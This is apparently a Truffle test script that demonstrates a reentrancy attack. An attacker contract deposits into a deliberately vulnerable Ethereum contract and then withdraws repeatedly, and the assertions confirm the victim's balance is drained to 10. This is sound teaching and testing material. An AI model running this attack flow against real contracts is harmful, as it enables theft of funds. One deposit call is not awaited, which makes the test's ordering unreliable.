var ReentrancyVulnerable = artifacts.require("./ReentrancyVulnerable.sol");
var ReentrancyAttacker = artifacts.require("./ReentrancyAttacker.sol");

contract("ReentrancyVulnerable", function (accounts) {

    var victim;
    var attacker;

    it("Test reentrancy", function() {
        // deploying the victim contract
        return ReentrancyVulnerable.deployed().then(instanceVictim => {
            victim = instanceVictim;
            return victim.address;
        }).then(address => {
            // deploying the attacker instance, passing the address of the victim
            return ReentrancyAttacker.new(address);
        }).then (instanceAttacker => {
            attacker = instanceAttacker;
        }).then(() => {
            return attacker.getContractBalance.call();
        }).then((attackerBalance => {
            // checking that the starting balance is 0
            assert.equal(0, attackerBalance);
            return victim.getContractBalance.call();
        })).then((victimBalance => {
            // checking that the starting balance is 0
            assert.equal(0, victimBalance);
            // deposit 410 from the account[0]
            return victim.deposit({gasPrice:0, value:410});
        })).then(() => {
            return victim.getContractBalance.call();
        }).then((victimBalance => {
            // checking that the contract balance no is 410
            assert.equal(410, victimBalance);
        })).then(() => {
            attacker.depositInContract({gasPrice:0, value: 100});
            return victim.getContractBalance.call();
        }).then(victimContractBalance => {
            // checking that the contract balance is 510
            assert.equal(510, victimContractBalance);
            return victim.checkBalance({from :accounts[0]});
        }).then(balanceAccount0 => {
            // checking account[0] balance is 410
            assert.equal(410, balanceAccount0);
            return victim.checkBalance({from : attacker.address});
        }).then(attackerBalance => {
            // checking that the attacker contract's balance is 100
            assert.equal(100, attackerBalance);
        }).then(() => {
            return attacker.withdraw({gasPrice:0, gasLimit:9999999999});
        }).then(() => {
            return victim.getContractBalance.call();
        }).then((victimBalance) => {
            // the remaining contract balance must be 10. The balance of
            // the attacker contract was 100, the total victim balance is 510,
            // and the attacker can only withdraw ether in bulks of 100,
            // 510 % 100 = 10
            assert.equal(10, victimBalance);
        });
    });
});
